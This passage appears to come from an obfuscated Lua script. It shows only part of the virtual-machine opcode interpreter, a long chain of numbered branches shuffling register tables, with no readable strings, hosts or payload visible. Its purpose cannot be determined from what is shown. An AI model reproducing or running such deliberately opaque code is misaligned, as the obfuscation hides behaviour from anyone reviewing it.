g;g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))end;elseif g<=136 then c[a[2]]=(a[3]~=0);elseif g>137 then local g;local i;local h;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];h=a[2]c[h]=c[h](f(c,h+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];g=c[i]for a=i+1,a[4]do g=g..c[a];end;c[a[2]]=g;b=b+1;a=d[b];if(c[a[2]]~=c[a[4]])then b=b+1;else b=a[3];end;else local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];end;elseif g<=143 then if g<=140 then if g>139 then c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];else c[a[2]]={};end;elseif g<=141 then local j;local k,l;local g;c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]k,l=i(c[g](f(c,g+1,a[3])))h=l+g-1 j=0;for a=g,h do j=j+1;c[a]=k[j];end;b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]k,l=i(c[g](f(c,g+1,a[3])))h=l+g-1 j=0;for a=g,h do j=j+1;c[a]=k[j];end;b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=a[3];elseif g>142 then local g;local i;local h;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];h=a[2]c[h]=c[h](f(c,h+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];g=c[i]for a=i+1,a[4]do g=g..c[a];end;c[a[2]]=g;b=b+1;a=d[b];if(c[a[2]]==c[a[4]])then b=b+1;else b=a[3];end;else c[a[2]]=c[a[3]];end;elseif g<=146 then if g<=144 then local g;local j;local k,m;local l;local g;c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];l=c[a[3]];c[g+1]=l;c[g]=l[a[4]];b=b+1;a=d[b];g=a[2]k,m=i(c[g](c[g+1]))h=m+g-1 j=0;for a=g,h do j=j+1;c[a]=k[j];end;b=b+1;a=d[b];g=a[2]k={c[g](f(c,g+1,h))};j=0;for a=g,a[4]do j=j+1;c[a]=k[j];end b=b+1;a=d[b];b=a[3];elseif g==145 then do return end;else local g;local f;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];f=a[2];g=c[a[3]];c[f+1]=g;c[f]=g[a[4]];b=b+1;a=d[b];f=a[2]c[f](c[f+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];end;elseif g<=147 then local b=a[2]c[b](f(c,b+1,a[3]))elseif g==148 then local j;local k,l;local g;c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]k,l=i(c[g](f(c,g+1,a[3])))h=l+g-1 j=0;for a=g,h do j=j+1;c[a]=k[j];end;b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];else c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=(a[3]~=0);b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];end;elseif g<=160 then if g<=154 then if g<=151 then if g>150 then local h=o[a[3]];local g;local f={};g=p({},{__index=function(b,a)local a=f[a];return a[1][a[2]];end,__newindex=function(c,a,b)local a=f[a]a[1][a[2]]=b;end;});for e=1,a[4]do b=b+1;local a=d[b];if a[1]==142 then f[e-1]={c,a[3]};else f[e-1]={k,a[3]};end;l[#l+1]=f;end;c[a[2]]=n(h,g,e);else c[a[2]]=#c[a[3]];end;elseif g<=152 then c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];elseif g>153 then c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];if(c[a[2]]~=a[4])then b=b+1;else b=a[3];end;else local h;local i;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];h=c[i]for a=i+1,a[4]do h=h..c[a];end;c[a[2]]=h;b=b+1;a=d[b];if(c[a[2]]~=c[a[4]])then b=b+1;else b=a[3];end;end;elseif g<=157 then if g<=155 then c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];elseif g>156 then local a=a[2]local d,b=i(c[a](f(c,a+1,h)))h=b+a-1 local b=0;for a=a,h do b=b+1;c[a]=d[b];end;else local e;c[a[2]]=c[a[3]];b=b+1;a=d[b];e=a[2]c[e]=c[e](c[e+1])b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];if c[a[2]]then b=b+1;else b=a[3];end;end;elseif g<=158 then local h;local g;g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];if(c[a[2]]==c[a[4]])then b=b+1;else b=a[3];end;elseif g==159 then c[a[2]]=k[a[3]];else local d=a[2];local f=c[d+2];local e=c[d]+f;c[d]=e;if(f>0)then if(e<=c[d+1])then b=a[3];c[d+3]=e;end elseif(e>=c[d+1])then b=a[3];c[d+3]=e;end end;elseif g<=165 then if g<=162 then if g==161 then local f;local h;local g;c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];g=a[2]h={c[g](c[g+1])};f=0;for a=g,a[4]do f=f+1;c[a]=h[f];end b=b+1;a=d[b];b=a[3];else local g;local j;local k,m;local l;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];l=c[a[3]];c[g+1]=l;c[g]=l[a[4]];b=b+1;a=d[b];g=a[2]k,m=i(c[g](c[g+1]))h=m+g-1 j=0;for a=g,h do j=j+1;c[a]=k[j];end;b=b+1;a=d[b];g=a[2]k={c[g](f(c,g+1,h))};j=0;for a=g,a[4]do j=j+1;c[a]=k[j];end b=b+1;a=d[b];b=a[3];end;elseif g<=163 then local e;c[a[2]]=c[a[3]];b=b+1;a=d[b];e=a[2]c[e]=c[e](c[e+1])b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];if(c[a[2]]~=c[a[4]])then b=b+1;else b=a[3];end;elseif g>164 then local h;local g;c[a[2]]();b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];else local h;local i;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];h=c[i]for a=i+1,a[4]do h=h..c[a];end;c[a[2]]=h;b=b+1;a=d[b];if(c[a[2]]==c[a[4]])then b=b+1;else b=a[3];end;end;elseif g<=168 then if g<=166 then local j;local l,k;local g;c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]l,k=i(c[g](f(c,g+1,a[3])))h=k+g-1 j=0;for a=g,h do j=j+1;c[a]=l[j];end;b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]